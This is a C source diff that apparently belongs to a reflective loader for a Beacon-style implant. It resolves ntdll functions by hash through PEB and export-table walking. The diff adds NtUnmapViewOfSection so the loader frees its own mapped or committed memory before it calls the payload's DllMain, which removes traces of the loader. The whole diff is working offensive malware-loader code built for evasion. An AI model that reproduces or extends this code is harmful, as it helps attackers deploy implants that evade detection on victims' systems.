@@ -16,12 +16,14 @@ DllMain( HINSTANCE, DWORD, LPVOID );
 
 typedef struct
 {
+	D_API( NtUnmapViewOfSection );
 	D_API( NtQueryVirtualMemory );
 	D_API( NtFreeVirtualMemory );
 	D_API( DllMain );
 } API ;
 
 /* API Hashes */
+#define H_API_NTUNMAPVIEWOFSECTION	0x6aa412cd /* NtUnmapViewOfSection */
 #define H_API_NTQUERYVIRTUALMEMORY	0x10c0e85d /* NtQueryVirtualMemory */
 #define H_API_NTFREEVIRTUALMEMORY	0x2802c609 /* NtFreeVirtualMemory */
 
@@ -49,6 +51,7 @@ D_SEC( E ) VOID PreMain( _In_ PVOID ImageBase, _In_ ULONG AddressOfEntryPoint )
 	RtlSecureZeroMemory( &Api, sizeof( Api ) );
 	RtlSecureZeroMemory( &Mbi, sizeof( Mbi ) );
 
+	Api.NtUnmapViewOfSection = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTUNMAPVIEWOFSECTION );
 	Api.NtQueryVirtualMemory = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTQUERYVIRTUALMEMORY );
 	Api.NtFreeVirtualMemory  = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTFREEVIRTUALMEMORY );
 
@@ -57,12 +60,18 @@ D_SEC( E ) VOID PreMain( _In_ PVOID ImageBase, _In_ ULONG AddressOfEntryPoint )
 
 	/* Free the memory associated with the Beacon */
 	if ( NT_SUCCESS( Api.NtQueryVirtualMemory( NtCurrentProcess(), Ret, MemoryBasicInformation, &Mbi, sizeof( Mbi ), NULL ) ) ) {
-		if ( NT_SUCCESS( Api.NtFreeVirtualMemory( NtCurrentProcess(), &Mbi.AllocationBase, &Len, MEM_RELEASE ) ) ) {
-			/* Call Main! */
-			Api.DllMain = C_PTR( U_PTR( ImageBase ) + AddressOfEntryPoint );
-			Api.DllMain( ImageBase, 1, NULL );
-			Api.DllMain( NULL, 4, NULL );
+		if ( Mbi.Type == MEM_MAPPED ) {
+			/* Free the section */
+			Api.NtUnmapViewOfSection( NtCurrentProcess(), Mbi.AllocationBase );
 		};
+		if ( Mbi.Type == MEM_COMMIT ) { 
+			/* Free the virtual region */
+			Api.NtFreeVirtualMemory( NtCurrentProcess(), &Mbi.AllocationBase, &Len, MEM_RELEASE );
+		};
+		/* Call Main! */
+		Api.DllMain = C_PTR( U_PTR( ImageBase ) + AddressOfEntryPoint );
+		Api.DllMain( ImageBase, 1, NULL );
+		Api.DllMain( NULL, 4, NULL );
 	};
 
 	/* Does Not Return */
